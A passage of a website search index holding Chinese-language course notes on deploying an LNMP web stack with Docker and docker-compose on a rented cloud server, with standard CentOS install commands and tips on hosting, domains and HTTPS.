\uff0c\u7136\u540e\u9009\u62e9\u4f60\u8981\u8c03\u8bd5\u7684\u8fdb\u7a0b\uff0c\u5c31\u53ef\u4ee5\u5f00\u59cb\u4f60\u7684\u8868\u6f14\u4e86\u3002 Tip \u4f60\u7684 linux_server \u8fd8\u662f\u8981\u5f00\u7740\u3002 \u5176\u5b9e\u6709\u5f88\u591a\u5de5\u5177\u3001\u5f88\u591a\u65b9\u6cd5\u8c03\u8bd5\u5f88\u591a\u5e73\u53f0\u7684\u7a0b\u5e8f\u7684\uff0c\u65f6\u95f4\u5173\u7cfb\u6211\u53ea\u597d\u5148\u5217\u4e3e\u5176\u4e2d\u5e38\u7528\u7684\u4e00\u79cd\u53ef\u4ee5\u6765\u8c03\u8bd5\u5b9e\u9a8c\u7684\u65b9\u6cd5\u4e86\uff0c\u540e\u7eed\u6709\u7a7a\u800c\u4e14\u6709\u5fc5\u8981\u7684\u8bdd\u6211\u4f1a\u6162\u6162\u8865\u4e0a\u3002","title":"\u8fd8\u6709Attach to process..."},{"location":"szu_courses/web/docker/","text":"\u6211\u5c31\u5047\u8bbe\u4f60\u5df2\u7ecf\u8981\u5f00\u59cb\u90e8\u7f72\u4f60\u7684\u670d\u52a1\u5230\u4e91\u4e3b\u673a\u4e0a\uff0c\u8ba9\u5927\u5bb6\u6765\u67e5\u770b\u4f60\u7684\u6210\u679c\u4e86\u3002\u53e6\u5916\uff0c\u6211\u8fd8\u5047\u8bbe\u4f60\u7684\u6280\u672f\u6808\u662fLNMP\u3002\uff08\u5176\u5b9e\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u7528\u4e5f\u6ca1\u5565\u95ee\u9898\uff09 \u5728\u8fc7\u53bb\uff0c\u4e3a\u4e86\u90e8\u7f72\u8fd9\u4e9b\u670d\u52a1\uff0c\u4f60\u9700\u8981\u6298\u817e\u76f8\u5f53\u4e00\u90e8\u5206\u547d\u4ee4\u548c\u914d\u7f6e\u6587\u4ef6\uff0c\u6211\u77e5\u9053\u8fd9\u53ef\u80fd\u5bf9\u4e00\u4e9b\u540c\u5b66\u6765\u8bf4\u662f\u5f88\u7b80\u5355\u7684\uff0c\u4f46\u662f\u53ef\u80fd\u5bf9\u67d0\u4e9b\u540c\u5b66\u6765\u8bf4\u4f1a\u5f88\u56f0\u96be\u3002\u4e0d\u4fe1\uff1f\u4f60\u53ef\u4ee5\u770b\u770bGoogle\u4e0a\u6709\u591a\u5c11\u5173\u4e8e\u914d\u7f6e\u8fd9\u4e9b\u4e1c\u897f\u65f6\u5019\u9047\u5230\u7684\u95ee\u9898\u3002 \u8fd9\u4e5f\u5c31\u662f\u4e3a\u5565\u7f51\u4e0a\u4f1a\u6709\u5404\u79cd\u4e0d\u603b\u662f\u90a3\u4e48\u9760\u8c31\u7684\u4e00\u952e\u5b89\u88c5\u811a\u672c\u4e4b\u7c7b\u7684\u4e1c\u897f\u4e86\u3002\u4e0d\u8fc7\uff0c\u4f60\u7684\u4e91\u4e3b\u673a\u63d0\u4f9b\u5546\u4e5f\u53ef\u80fd\u4e3a\u4f60\u63d0\u4f9b\u4e86\u4f60\u9700\u8981\u7684\u5df2\u7ecf\u90e8\u7f72\u597d\u73af\u5883\u7684\u955c\u50cf\uff0c\u8fd9\u8981\u9760\u8c31\u5f97\u591a\uff0c\u4f60\u53ea\u9700\u8981\u8d2d\u4e70\u4ed6\u4eec\u7684\u4e91\u4e3b\u673a\u4ea7\u54c1\uff0c\u4e00\u822c\u5c31\u80fd\u9009\u62e9\u5230\u9002\u5408\u81ea\u5df1\u7684\u955c\u50cf\u7136\u540e\u90e8\u7f72\u5230\u4e91\u4e3b\u673a\u4e0a\u3002 \u4f46\u662f\u6bd4\u8d77\u955c\u50cf\uff0c\u6211\u8fd8\u662f\u63a8\u8350\u4f60\u4f7f\u7528Docker\u3002\u9996\u5148\uff0c\u5229\u7528docker-compose\uff0c\u4f60\u53ef\u4ee5\u4e00\u952e\u5feb\u901f\u5730\u90e8\u7f72\u597d\u5e94\u7528\uff1b\u5176\u6b21\uff0c\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u7684\u9694\u79bb\u80fd\u4f7f\u5f97\u670d\u52a1\u5668\u4e0a\u7684\u8d44\u6e90\u88ab\u66f4\u597d\u5730\u7ba1\u7406\uff0c\u4e5f\u66f4\u5b89\u5168\uff1b\u8fd8\u6709\uff0c\u5728\u5176\u4ed6\u673a\u5668\u4e0a\u90e8\u7f72\u3001\u8fc1\u79fb\u90fd\u53ef\u4ee5\u53d8\u5f97\u76f8\u5f53\u5feb\u3002 \u6211\u5c31\u4e0d\u5728\u8fd9\u91cc\u778e\u626f\u8fd9\u4e9b\u4f18\u70b9\u4e86\uff0c\u6709\u5173\u8fd9\u4e9b\u5185\u5bb9\uff0c\u4f60\u53ef\u4ee5\u53c2\u9605\u5f88\u591a\u4e1c\u897f\uff1a Why Docker? | Docker Docker \u6709\u4ec0\u4e48\u4f18\u52bf\uff1f - \u77e5\u4e4e \u9996\u5148\u4f60\u8981\u6709\u4e2a\u4e91\u4e3b\u673a \u4e8b\u5b9e\u4e0a\u4f60\u53ef\u4ee5\u5728\u672c\u5730\u4e0a\u5b89\u88c5Docker\uff0c\u5e76\u4e14\u90e8\u7f72\u670d\u52a1\u3002\u751a\u81f3\u53ef\u4ee5\u5728\u81ea\u5df1\u7684\u865a\u62df\u673a\u4e0a\u5b89\u88c5\u3002\u4e0d\u8fc7\uff0c\u5728\u4e91\u4e3b\u673a\u4e0a\u62c9\u53d6\u955c\u50cf\u3001\u5b89\u88c5\u4f9d\u8d56\u90fd\u8981\u6bd4\u672c\u5730\u5feb\u5f97\u591a\uff0c\u95ee\u9898\u4e5f\u5c11\u5f97\u591a\u3002 \u5982\u679c\u4f60\u8fd8\u6ca1\u6709\u4e91\u4e3b\u673a\uff0c\u6211\u63a8\u8350\u4f7f\u7528\u8fd9\u4e9b\uff1a \u8f7b\u91cf\u5e94\u7528\u670d\u52a1\u5668_Web\u670d\u52a1\u5668\u79df\u8d41_\u7f51\u7ad9\u670d\u52a1\u5668\u4ef7\u683c_VPS\u670d\u52a1\u5668\u79df\u7528_\u7b80\u5355\u7684\u670d\u52a1\u5668 - \u963f\u91cc\u4e91 \u6211\u5efa\u8bae\u8d2d\u4e70\u9999\u6e2f\u7684\u670d\u52a1\u5668\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u514d\u53bb\u5907\u6848\u7684\u6d41\u7a0b\uff0c\u5e76\u4e14\u8bbf\u95ee\u4e5f\u4e0d\u81f3\u4e8e\u6162\u300224\u5143/\u67081C1G25G\u300134\u5143/\u67081C2G50G\u7684\u914d\u7f6e\u4e5f\u7b97\u76f8\u5f53\u4fbf\u5b9c\u4e86\u3002 \u53e6\u5916\uff0c\u8fd8\u6709\u8fd9\u5bb6\u4e5f\u4e0d\u9519\uff1a DigitalOcean \u2013 The developer cloud \u8fd9\u4e2a\u94fe\u63a5\u5185\u542b\u6211\u7684\u9080\u8bf7\u3002\u5370\u8c61\u4e2d\u6211\u521a\u5165\u5b66\u90a3\u4f1a\u513f\u7533\u8bf7 GitHub Student Developer Pack - GitHub Education \u53ef\u4ee5\u6709\u4e00\u5b9a\u6570\u989d\u7684\u8bd5\u7528\u3002\u6700\u4f4e5\u7f8e\u5143/\u6708\uff0c\u6309\u5c0f\u65f6\u8ba1\u8d39\u3002 \u5f53\u7136\uff0c\u8fd9\u4e2a\u4ef7\u4f4d\u7684\u7ebf\u8def\u5fc5\u7136\u662f\u4e00\u822c\u7684\u90a3\u79cd\u3002\u5982\u679c\u4f60\u60f3\u8981CN2\u4e4b\u7c7b\u7684\u5c31\u81ea\u884c\u53d1\u6398\u5427\u3002 \u4f60\u53ef\u80fd\u77e5\u9053\u670910\u5143/\u6708\u7684\u5b66\u751f\u7279\u4f9b\u4e3b\u673a\uff0c\u4e0d\u8fc7\u5b83\u5728\u5927\u9646\u533a\u57df\u5185\uff0c\u4e5f\u5c31\u610f\u5473\u7740\u4f60\u9700\u8981\u5907\u6848\u624d\u80fd\u5c06\u57df\u540d\u89e3\u6790\u5230\u8fd9\u4e2a\u4e3b\u673a\u4e0a\u3002 \u5047\u8bbe\u4f60\u5df2\u7ecf\u62e5\u6709\u4e86\u4e00\u4e2a\u4e91\u4e3b\u673a \u5b89\u88c5\u7684\u65f6\u5019\u9009\u62e9\u4e00\u4e2a\u7eaf\u51c0\u7684\u7cfb\u7edf\u955c\u50cf\u5c31\u53ef\u4ee5\u4e86\u3002 Tip \u5b89\u88c5\u7cfb\u7edf\u65f6\u8bf7\u6ce8\u610f\uff0c\u5efa\u8bae\u901a\u8fc7\u5bc6\u94a5\u8fde\u63a5\u800c\u975e\u5bc6\u7801\u3002 \u4f60\u5e94\u8be5\u4f1a\u8fde\u63a5\u4f60\u7684\u4e3b\u673a\u5427\uff1f\u4f60\u53ef\u4ee5\u9009\u62e9\u901a\u8fc7\u4e3b\u673a\u5546\u7684WebShell\u8fdb\u884c\u8fde\u63a5\u5e76\u8fdb\u884c\u63a7\u5236\uff0c\u6216\u662f\u901a\u8fc7SSH\u4f7f\u7528\u5bc6\u94a5\u8fdb\u884c\u8fde\u63a5\u3002\u5982\u679c\u4f60\u6b63\u5728\u4f7f\u7528Windows\uff0c\u6211\u5efa\u8bae\u4f7f\u7528Xshell\u901a\u8fc7SSH\u6765\u8fde\u63a5\u5e76\u63a7\u5236\u4f60\u7684\u670d\u52a1\u5668\u3001\u7528Xftp\u6765\u4f20\u8f93\u6587\u4ef6\u3002 \u4f60\u53ef\u80fd\u6709\u4e00\u5b9a\u4f7f\u7528Linux\u7684\u57fa\u7840\uff0c\u4e0d\u8fc7\u4e5f\u8bf7\u4e0d\u8981\u5148\u6025\u7740\u76f4\u63a5\u7528\u4f60\u7684\u5305\u7ba1\u7406\u5de5\u5177\u76f4\u63a5\u5f00\u59cb\u5b89\u88c5Docker\u3002\u8bf7\u53c2\u9605\u8fd9\u91cc\u5f00\u59cb\u5b89\u88c5\uff1a \u5bf9\u4e8eCentOS\uff0c\u8bf7\u67e5\u770b\u8fd9\u91cc\uff1a Get Docker Engine - Community for CentOS | Docker Documentation \u5176\u4ed6Linux\u53d1\u884c\u7248\u4f8b\u5982Debian\u3001Ubuntu\u7b49\uff0c\u53ef\u4ee5\u5728\u4e0a\u8ff0\u94fe\u63a5\u7684\u5de6\u4fa7\u76ee\u5f55\u4e2d\u627e\u5230\u5bf9\u5e94\u7cfb\u7edf\u7684\u5b89\u88c5\u6307\u5357\u3002 \u6211\u5e9f\u8bdd\u51e0\u53e5\u7ffb\u8bd1\u4e00\u4e0b...\u4e3b\u8981\u8fc7\u7a0b\u5c31\u662f\u5220\u6389\u65e7\u7248\uff1a 1 2 3 4 5 6 7 8 $ sudo yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-engine \u7136\u540e\u5b89\u88c5\u4f9d\u8d56\uff1a 1 2 3 $ sudo yum install -y yum-utils \\ device-mapper-persistent-data \\ lvm2 \u7136\u540e\u6dfb\u52a0repo\uff08\u5176\u5b83\u7248\u672c\u53c2\u9605\u5b98\u65b9\u6587\u6863\uff09\uff1a 1 2 3 $ sudo yum-config-manager \\ --add-repo \\ https://download.docker.com/linux/centos/docker-ce.repo \u7136\u540e\u5c31\u53ef\u4ee5\u5b89\u88c5Docker\u4e86\uff1a 1 $ sudo yum install docker-ce docker-ce-cli containerd.io \u5176\u4e2dGPG key\u76ee\u524d\u5e94\u5f53\u662f 060A 61C5 1B55 8A7F 742B 77AA C52F EB6B 621E 9F35 \uff0c\u5426\u5219\u53ef\u80fd\u5f88\u5371\u9669\u3002 \u6ce8\u610f\uff0c\u8fd9\u4e2a\u65f6\u5019\u8fd8\u9700\u8981\u5b89\u88c5\u4e00\u4e0b docker-compose \uff1a 1 $ sudo yum install docker-compose \u8fd9\u6837\u5e94\u8be5\u5c31\u5b8c\u6210\u4e86\u3002\u4f60\u9700\u8981\u542f\u52a8Docker\u624d\u80fd\u5f00\u59cb\u4f7f\u7528\uff1a 1 $ sudo systemctl start docker \u6709\u5173Docker\u7684\u4e00\u4e9b\u57fa\u672c\u6982\u5ff5\u4f8b\u5982image\u3001container\uff0c\u548c\u4e00\u4e9b\u57fa\u672c\u64cd\u4f5c\u4f8b\u5982run\u3001exec\uff0c\u8bf7\u53c2\u9605\u5b98\u65b9\u6587\u6863\uff1a docker run | Docker Documentation \u6709\u672c\u4e66\u4e0d\u9519\uff1a Docker Cookbook - O'Reilly Media \u3002\u4e2d\u6587\u7248\u4e66\u540d\u662f Docker\u7ecf\u5178\u5b9e\u4f8b \u3002 \u542f\u52a8 \u597d\u7684\u6211\u7279\u610f\u5199\u4e86\u4e00\u4e2a\u5f88\u57fa\u7840\u7684\u3001\u751a\u81f3\u6ca1\u6709HTTPS\u7684\u3001\u4f46\u662f\u542b\u6709PHP\u548cMySQL\u7684\u5f88\u7b80\u5355\u7684LNMP\u7684docker-compose\uff1a szu17dmy/docker-compose-lnmp \u987a\u4fbf\u8bf4\u4e00\u4e0b...\u5982\u679c\u60f3\u8981HTTPS\u4e5f\u5f88\u7b80\u5355\uff0c\u7a0d\u5fae\u52a0\u70b9\u4e1c\u897f\u5c31\u53ef\u4ee5\u4e86\uff0c\u6709\u7a7a\u518d\u641e\u3002\u4e0d\u8fc7\u6211\u4e00\u822c\u6ca1\u8ba9docker\u4e0aHTTPS\uff0c\u5e76\u4e14\u53ea\u5141\u8bb8localhost\u8bbf\u95ee\uff0c\u7136\u540e\u518d\u7528\u672c\u5730\u4e3b\u673a\u4e0a\u7684nginx\u53cd\u5411\u4ee3\u7406\u5b83\u4eec\u3002 \u597d\u4e86\u76f4\u5165\u6b63\u9898\u3002\u5982\u679c\u4f60\u7684\u4e3b\u673a\u4e0a\u6709git\u7684\u8bdd\uff08\u5e0c\u671b\u4f60\u4e0d\u7528\u95ee\u6211\u6ca1\u6709\u600e\u4e48\u529e...\u6ca1\u6709\u5c31\u88c5\u554a...\u7528\u5305\u7ba1\u7406\u5668\u76f4\u63a5\u88c5\u5c31\u597d\u4e86\uff09\uff0c\u4f60\u5c31\u53ef\u4ee5\u76f4\u63a5\uff1a 1 git clone https://github.com/szu17dmy/docker-compose-lnmp.git && cd ./docker-compose-lnmp \u7136\u540e\u5c31\u53ef\u4ee5\u6765\u542f\u52a8\u670d\u52a1\u4e86\uff1a 1 docker-compose up -d \u8fd9\u5c06\u6309\u7167 docker-compose.yml \u4e2d\u7684\u5185\u5bb9\u6765\u540e\u53f0\u542f\u52a8\u3002\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u4f60\u80fd\u901a\u8fc7\uff1a 1 docker ps -a \u6765\u67e5\u770b\u5404\u5bb9\u5668\u7684\u8fd0\u884c\u60c5\u51b5\u3002\u8fd9\u4e2a\u65f6\u5019\uff0c\u5982\u679c\u4f60\u5df2\u7ecf\u901a\u8fc7\u4f8b\u5982SFTP\u6216\u662fnc\u7b49\u65b9\u5f0f\u5c06\u4f60\u7684\u4ee3\u7801\u4f20\u5230\u4e86 www \u6587\u4ef6\u5939\u4e0b\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\uff1a 1 curl localhost/YOUR_WEB_PAGE_HERE \u6765\u67e5\u770b\u4f60\u7684\u4e3b\u9875\u662f\u5426\u80fd\u6b63\u5e38\u663e\u793a\u3002\u6216\u662f\u76f4\u63a5\u5728\u4f60\u7684\u6d4f\u89c8\u5668\u91cc\u76f4\u63a5\u8bbf\u95ee\u8fd9\u53f0\u4e3b\u673a\u7684IP\u548c\u76f8\u5e94\u7684URI\u3002 \u60f3\u6539\u52a8\u4f60\u7684\u4ee3\u7801\uff1f\u4f60\u53ea\u9700\u8981\u8fdb\u5165 www \u7684\u6587\u4ef6\u5939\uff0c\u6539\u52a8\u91cc\u9762\u7684\u4ee3\u7801\u4e4b\u540e\u518d\u5237\u65b0\u6d4f\u89c8\u5668\u5c31\u53ef\u4ee5\u4e86\u3002 \u57df\u540d\u89e3\u6790 \u7a81\u7136\u53d1\u73b0\u6211\u5fd8\u8bb0\u63d0\u4e00\u4e0b\u8fd9\u4e2a\u73af\u8282\u4e86... \u4f60\u4e00\u5b9a\u4e0d\u60f3\u6bcf\u6b21\u8bbf\u95ee\u4f60\u7684\u7f51\u7ad9\u6216\u662f\u5411\u540c\u5b66\u5c55\uff08xuan\uff09\u793a\uff08yao\uff09\u90fd\u8981\u8f93\u4e00\u957f\u4e32IP\u5730\u5740\u5427\uff0c\u8fd9\u4e2a\u65f6\u5019\u8be5\u6765\u628a\u4e00\u4e2a\u57df\u540d\u89e3\u6790\u5230\u4f60\u7684\u670d\u52a1\u5668\u4e0a\u4e86\u3002 \u6839\u636e\u4f60\u7684\u9700\u6c42\u548c\u7ecf\u6d4e\u6761\u4ef6\uff0c\u9009\u62e9\u4e00\u4e2a\u9002\u5408\u81ea\u5df1\u7684\u57df\u540d\u3002\u6258\u7ba1\u7f51\u7ad9\u6709\u5f88\u591a\uff0c \u963f\u91cc\u4e91 \u3001 \u817e\u8baf\u4e91 \u3001 GoDaddy \u3001 name.com \u7b49\u7b49\uff0c\u81ea\u884c\u9009\u62e9\u5373\u53ef\u3002\u4e70\u4e0b\u4e00\u4e2a\u57df\u540d\u540e\uff0c\u5c31\u53ef\u4ee5\u5230\u57df\u540d\u63a7\u5236\u53f0\u91cc\u6dfb\u52a0\u89e3\u6790\u8bb0\u5f55\u4e86\u3002\u4f60\u53ef\u4ee5\u5c1d\u8bd5\u7740\u6dfb\u52a0\u4e00\u6761\u6307\u5411\u4f60\u7684\u670d\u52a1\u5668IP\u7684\u8bb0\u5f55\uff0c\u4e00\u65e6\u6dfb\u52a0\u6210\u529f\uff0c\u4f60\u5e94\u8be5\u5c31\u53ef\u4ee5\u901a\u8fc7\u57df\u540d\u6765\u8bbf\u95ee\u4f60\u7684\u670d\u52a1\u5668\u4e86\u3002 \u5728\u8fd9\u4e4b\u540e\uff0c\u4f60\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0b\u7533\u8bf7\u514d\u8d39\u7684SSL\u8bc1\u4e66\uff0c\u6765\u5f00\u542f\u4f60\u7684\u7ad9\u70b9\u7684HTTPS\u8bbf\u95ee\u3002\u5e76\u4e14\uff0c\u4f60\u8fd8\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0b\u4f7f\u7528 Cloudflare \u7684\u670d\u52a1\u6765\u4fdd\u62a4\u4f60\u7684\u7f51\u7ad9\u7684\u5b89\u5168\uff0c\u6216\u662f\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u964d\u4f4e\u4f60\u7684\u670d\u52a1\u5668\u7684\u538b\u529b\u3002","title":"Dockerize"},{"location":"szu_courses/web/docker/#_1","text":"\u4e8b\u5b9e\u4e0a\u4f60\u53ef\u4ee5\u5728\u672c\u5730\u4e0a\u5b89\u88c5Docker\uff0c\u5e76\u4e14\u90e8\u7f72\u670d\u52a1\u3002\u751a\u81f3\u53ef\u4ee5\u5728\u81ea\u5df1\u7684\u865a\u62df\u673a\u4e0a\u5b89\u88c5\u3002\u4e0d\u8fc7\uff0c\u5728\u4e91\u4e3b\u673a\u4e0a\u62c9\u53d6\u955c\u50cf\u3001\u5b89\u88c5\u4f9d\u8d56\u90fd\u8981\u6bd4\u672c\u5730\u5feb\u5f97\u591a\uff0c\u95ee\u9898\u4e5f\u5c11\u5f97\u591a\u3002 \u5982\u679c\u4f60\u8fd8\u6ca1\u6709\u4e91\u4e3b\u673a\uff0c\u6211\u63a8\u8350\u4f7f\u7528\u8fd9\u4e9b\uff1a \u8f7b\u91cf\u5e94\u7528\u670d\u52a1\u5668_Web\u670d\u52a1\u5668\u79df\u8d41_\u7f51\u7ad9\u670d\u52a1\u5668\u4ef7\u683c_VPS\u670d\u52a1\u5668\u79df\u7528_\u7b80\u5355\u7684\u670d\u52a1\u5668 - \u963f\u91cc\u4e91 \u6211\u5efa\u8bae\u8d2d\u4e70\u9999\u6e2f\u7684\u670d\u52a1\u5668\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u514d\u53bb\u5907\u6848\u7684\u6d41\u7a0b\uff0c\u5e76\u4e14\u8bbf\u95ee\u4e5f\u4e0d\u81f3\u4e8e\u6162\u300224\u5143/\u67081C1G25G\u300134\u5143/\u67081C2G50G\u7684\u914d\u7f6e\u4e5f\u7b97\u76f8\u5f53\u4fbf\u5b9c\u4e86\u3002 \u53e6\u5916\uff0c\u8fd8\u6709\u8fd9\u5bb6\u4e5f\u4e0d\u9519\uff1a DigitalOcean \u2013 The developer cloud \u8fd9\u4e2a\u94fe\u63a5\u5185\u542b\u6211\u7684\u9080\u8bf7\u3002\u5370\u8c61\u4e2d\u6211\u521a\u5165\u5b66\u90a3\u4f1a\u513f\u7533\u8bf7 GitHub Student Developer Pack - GitHub Education \u53ef\u4ee5\u6709\u4e00\u5b9a\u6570\u989d\u7684\u8bd5\u7528\u3002\u6700\u4f4e5\u7f8e\u5143/\u6708\uff0c\u6309\u5c0f\u65f6\u8ba1\u8d39\u3002 \u5f53\u7136\uff0c\u8fd9\u4e2a\u4ef7\u4f4d\u7684\u7ebf\u8def\u5fc5\u7136\u662f\u4e00\u822c\u7684\u90a3\u79cd\u3002\u5982\u679c\u4f60\u60f3\u8981CN2\u4e4b\u7c7b\u7684\u5c31\u81ea\u884c\u53d1\u6398\u5427\u3002 \u4f60\u53ef\u80fd\u77e5\u9053\u670910\u5143/\u6708\u7684\u5b66\u751f\u7279\u4f9b\u4e3b\u673a\uff0c\u4e0d\u8fc7\u5b83\u5728\u5927\u9646\u533a\u57df\u5185\uff0c\u4e5f\u5c31\u610f\u5473\u7740\u4f60\u9700\u8981\u5907\u6848\u624d\u80fd\u5c06\u57df\u540d\u89e3\u6790\u5230\u8fd9\u4e2a\u4e3b\u673a\u4e0a\u3002","title":"\u9996\u5148\u4f60\u8981\u6709\u4e2a\u4e91\u4e3b\u673a"},{"location":"szu_courses/web/docker/#_2","text":"\u5b89\u88c5\u7684\u65f6\u5019\u9009\u62e9\u4e00\u4e2a\u7eaf\u51c0\u7684\u7cfb\u7edf\u955c\u50cf\u5c31\u53ef\u4ee5\u4e86\u3002 Tip \u5b89\u88c5\u7cfb\u7edf\u65f6\u8bf7\u6ce8\u610f\uff0c\u5efa\u8bae\u901a\u8fc7\u5bc6\u94a5\u8fde\u63a5\u800c\u975e\u5bc6\u7801\u3002 \u4f60\u5e94\u8be5\u4f1a\u8fde\u63a5\u4f60\u7684\u4e3b\u673a\u5427\uff1f\u4f60\u53ef\u4ee5\u9009\u62e9\u901a\u8fc7\u4e3b\u673a\u5546\u7684WebShell\u8fdb\u884c\u8fde\u63a5\u5e76\u8fdb\u884c\u63a7\u5236\uff0c\u6216\u662f\u901a\u8fc7SSH\u4f7f\u7528\u5bc6\u94a5\u8fdb\u884c\u8fde\u63a5\u3002\u5982\u679c\u4f60\u6b63\u5728\u4f7f\u7528Windows\uff0c\u6211\u5efa\u8bae\u4f7f\u7528Xshell\u901a\u8fc7SSH\u6765\u8fde\u63a5\u5e76\u63a7\u5236\u4f60\u7684\u670d\u52a1\u5668\u3001\u7528Xftp\u6765\u4f20\u8f93\u6587\u4ef6\u3002 \u4f60\u53ef\u80fd\u6709\u4e00\u5b9a\u4f7f\u7528Linux\u7684\u57fa\u7840\uff0c\u4e0d\u8fc7\u4e5f\u8bf7\u4e0d\u8981\u5148\u6025\u7740\u76f4\u63a5\u7528\u4f60\u7684\u5305\u7ba1\u7406\u5de5\u5177\u76f4\u63a5\u5f00\u59cb\u5b89\u88c5Docker\u3002\u8bf7\u53c2\u9605\u8fd9\u91cc\u5f00\u59cb\u5b89\u88c5\uff1a \u5bf9\u4e8eCentOS\uff0c\u8bf7\u67e5\u770b\u8fd9\u91cc\uff1a Get Docker Engine - Community for CentOS | Docker Documentation \u5176\u4ed6Linux\u53d1\u884c\u7248\u4f8b\u5982Debian\u3001Ubuntu\u7b49\uff0c\u53ef\u4ee5\u5728\u4e0a\u8ff0\u94fe\u63a5\u7684\u5de6\u4fa7\u76ee\u5f55\u4e2d\u627e\u5230\u5bf9\u5e94\u7cfb\u7edf\u7684\u5b89\u88c5\u6307\u5357\u3002 \u6211\u5e9f\u8bdd\u51e0\u53e5\u7ffb\u8bd1\u4e00\u4e0b...\u4e3b\u8981\u8fc7\u7a0b\u5c31\u662f\u5220\u6389\u65e7\u7248\uff1a 1 2 3 4 5 6 7 8 $ sudo yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-engine \u7136\u540e\u5b89\u88c5\u4f9d\u8d56\uff1a 1 2 3 $ sudo yum install -y yum-utils \\ device-mapper-persistent-data \\ lvm2 \u7136\u540e\u6dfb\u52a0repo\uff08\u5176\u5b83\u7248\u672c\u53c2\u9605\u5b98\u65b9\u6587\u6863\uff09\uff1a 1 2 3 $ sudo yum-config-manager \\ --add-repo \\ https://download.docker.com/linux/centos/docker-ce.repo \u7136\u540e\u5c31\u53ef\u4ee5\u5b89\u88c5Docker\u4e86\uff1a 1 $ sudo yum install docker-ce docker-ce-cli containerd.io \u5176\u4e2dGPG key\u76ee\u524d\u5e94\u5f53\u662f 060A 61C5 1B55 8A7F 742B 77AA C52F EB6B 621E 9F35 \uff0c\u5426\u5219\u53ef\u80fd\u5f88\u5371\u9669\u3002 \u6ce8\u610f\uff0c\u8fd9\u4e2a\u65f6\u5019\u8fd8\u9700\u8981\u5b89\u88c5\u4e00\u4e0b docker-compose \uff1a 1 $ sudo yum install docker-compose \u8fd9\u6837\u5e94\u8be5\u5c31\u5b8c\u6210\u4e86\u3002\u4f60\u9700\u8981\u542f\u52a8Docker\u624d\u80fd\u5f00\u59cb\u4f7f\u7528\uff1a 1 $ sudo systemctl start docker \u6709\u5173Docker\u7684\u4e00\u4e9b\u57fa\u672c\u6982\u5ff5\u4f8b\u5982image\u3001container\uff0c\u548c\u4e00\u4e9b\u57fa\u672c\u64cd\u4f5c\u4f8b\u5982run\u3001exec\uff0c\u8bf7\u53c2\u9605\u5b98\u65b9\u6587\u6863\uff1a docker run | Docker Documentation \u6709\u672c\u4e66\u4e0d\u9519\uff1a Docker Cookbook - O'Reilly Media \u3002\u4e2d\u6587\u7248\u4e66\u540d\u662f Docker\u7ecf\u5178\u5b9e\u4f8b \u3002","title":"\u5047\u8bbe\u4f60\u5df2\u7ecf\u62e5\u6709\u4e86\u4e00\u4e2a\u4e91\u4e3b\u673a"},{"location":"szu_courses/web/docker/#_3","text":"\u597d\u7684\u6211\u7279\u610f\u5199\u4e86\u4e00\u4e2a\u5f88\u57fa\u7840\u7684\u3001\u751a\u81f3\u6ca1\u6709HTTPS\u7684\u3001\u4f46\u662f\u542b\u6709PHP\u548cMySQL\u7684\u5f88\u7b80\u5355\u7684LNMP\u7684docker-compose\uff1a szu17dmy/docker-compose-lnmp \u987a\u4fbf\u8bf4\u4e00\u4e0b...\u5982\u679c\u60f3\u8981HTTPS\u4e5f\u5f88\u7b80\u5355\uff0c\u7a0d\u5fae\u52a0\u70b9\u4e1c\u897f\u5c31\u53ef\u4ee5\u4e86\uff0c\u6709\u7a7a\u518d\u641e\u3002\u4e0d\u8fc7\u6211\u4e00\u822c\u6ca1\u8ba9docker\u4e0aHTTPS\uff0c\u5e76\u4e14\u53ea\u5141\u8bb8localhost\u8bbf\u95ee\uff0c\u7136\u540e\u518d\u7528\u672c\u5730\u4e3b\u673a\u4e0a\u7684nginx\u53cd\u5411\u4ee3\u7406\u5b83\u4eec\u3002 \u597d\u4e86\u76f4\u5165\u6b63\u9898\u3002\u5982\u679c\u4f60\u7684\u4e3b\u673a\u4e0a\u6709git\u7684\u8bdd\uff08\u5e0c\u671b\u4f60\u4e0d\u7528\u95ee\u6211\u6ca1\u6709\u600e\u4e48\u529e...\u6ca1\u6709\u5c31\u88c5\u554a...\u7528\u5305\u7ba1\u7406\u5668\u76f4\u63a5\u88c5\u5c31\u597d\u4e86\uff09\uff0c\u4f60\u5c31\u53ef\u4ee5\u76f4\u63a5\uff1a 1 git clone https://github.com/szu17dmy/docker-compose-lnmp.git && cd ./docker-compose-lnmp \u7136\u540e\u5c31\u53ef\u4ee5\u6765\u542f\u52a8\u670d\u52a1\u4e86\uff1a 1 docker-compose up -d \u8fd9\u5c06\u6309\u7167 docker-compose.yml \u4e2d\u7684\u5185\u5bb9\u6765\u540e\u53f0\u542f\u52a8\u3002\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u4f60\u80fd\u901a\u8fc7\uff1a 1 docker ps -a \u6765\u67e5\u770b\u5404\u5bb9\u5668\u7684\u8fd0\u884c\u60c5\u51b5\u3002\u8fd9\u4e2a\u65f6\u5019\uff0c\u5982\u679c\u4f60\u5df2\u7ecf\u901a\u8fc7\u4f8b\u5982SFTP\u6216\u662fnc\u7b49\u65b9\u5f0f\u5c06\u4f60\u7684\u4ee3\u7801\u4f20\u5230\u4e86 www \u6587\u4ef6\u5939\u4e0b\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\uff1a 1 curl localhost/YOUR_WEB_PAGE_HERE \u6765\u67e5\u770b\u4f60\u7684\u4e3b\u9875\u662f\u5426\u80fd\u6b63\u5e38\u663e\u793a\u3002\u6216\u662f\u76f4\u63a5\u5728\u4f60\u7684\u6d4f\u89c8\u5668\u91cc\u76f4\u63a5\u8bbf\u95ee\u8fd9\u53f0\u4e3b\u673a\u7684IP\u548c\u76f8\u5e94\u7684URI\u3002 \u60f3\u6539\u52a8\u4f60\u7684\u4ee3\u7801\uff1f\u4f60\u53ea\u9700\u8981\u8fdb\u5165 www 